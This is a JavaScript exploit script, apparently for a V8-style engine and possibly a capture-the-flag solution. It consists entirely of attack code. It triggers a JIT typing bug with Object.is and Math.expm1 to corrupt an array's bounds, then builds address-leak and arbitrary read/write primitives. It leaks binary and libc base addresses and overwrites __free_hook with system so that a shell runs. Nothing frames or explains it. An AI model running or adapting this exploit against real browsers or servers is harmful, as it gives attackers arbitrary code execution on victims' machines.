let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
};
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
};
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
};
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
};
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
};
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
};

function f(x) {
  let arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
  let arr2 = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
  let arr3 = [Array, 2, 3, 4, 5, 6];
  let float_array = new Float64Array(7);

  let o = {
    m0_0: -0,
    m0_1: -0,
    m0_2: -0,
    m0_3: -0,
    m0_4: -0,
    m0_5: -0,
    m0_6: -0,
    m0_7: -0,
    m0_8: -0,
    m0_9: -0,
    m0_10: -0,
    m0_11: -0,
    m0_12: -0,
    m0_13: -0,
    m0_14: -0,
    m0_15: -0,
    m0_16: -0,
    m0_17: -0,
    m0_18: -0,
    m0_19: -0,
    m0_20: -0,
    m0_21: -0,
    m0_22: -0,
    m0_23: -0,
    m0_24: -0,
    m0_25: -0,
    m0_26: -0,
    m0_27: -0,
    m0_28: -0,
    m0_29: -0,
    m0_30: -0,
    m0_31: -0,
    m0_32: -0,
  };
  let b = Object.is(o.m0_32, Math.expm1(x));
  let ret = b*0x7;
  arr[ret] = 2.1729236899484e-311;
  return [arr2, arr3, float_array];
}

function g(x) {
  return f(x);
}

f(0);
for (let i = 0; i < 10000; i++) {
  f(0);
}
f("0");
console.log(g(0));
for (let i = 0; i < 10000; i++) {
  g(0);
}
let res = g(-0);
let g2 = res[0];
let g3 = res[1];
let g4 = res[2];
g2[100] = 1;

const g3_off = 12;
const ab_off = 22;
const ab_backing_store_off = ab_off + 0x15;

if (g2[ab_off+5].f2i() != 0x38n || g2[ab_off+6].f2smi() != 0x7n) {
  throw 'array buffer not at expected location';
}
g4[0] = 5.5;
if (g2[ab_backing_store_off] != g4[0]) {
  throw 'array buffer backing store not at expected location';
}

function leak_ptr(o) {
  g3[0] = o;
  let ptr = g2[g3_off];
  g3[0] = 0;
  return ptr.f2i();
}
function readq(addr) {
  let old = g2[ab_off+2];
  g2[ab_backing_store_off-2] = (addr-0x20n|1n).i2f();
  let q = g4[0];
  g2[ab_off+2] = old;
  return q.f2i();
}
function writeq(addr, val) {
  let old = g2[ab_off+2];
  g2[ab_backing_store_off-2] = (addr-0x20n|1n).i2f();
  g4[0] = val.i2f();
  g2[ab_off+2] = old;
}

let Array_addr = leak_ptr(Array);
console.log('Array_addr: ' + Array_addr.hex());

let Array_code_addr = readq(Array_addr + 6n*8n);
let builtin_val = readq(Array_code_addr+8n*8n);
let Array_builtin_addr = builtin_val >> 16n;
console.log('Array_builtin_addr: ' + Array_builtin_addr.hex());

let bin_base = Array_builtin_addr - 0xe85620n;
console.log(`bin base: ${bin_base.hex()}`);

let cxa_finalize_got = bin_base + 0x115eb10n;

let libc_base = readq(cxa_finalize_got) - 0x43520n;
console.log('libc base: ' + libc_base.hex());

let free_hook = libc_base+0x3ed8e8n;
let system = libc_base+0x4f440n;
writeq(free_hook, system);
console.log('sh');
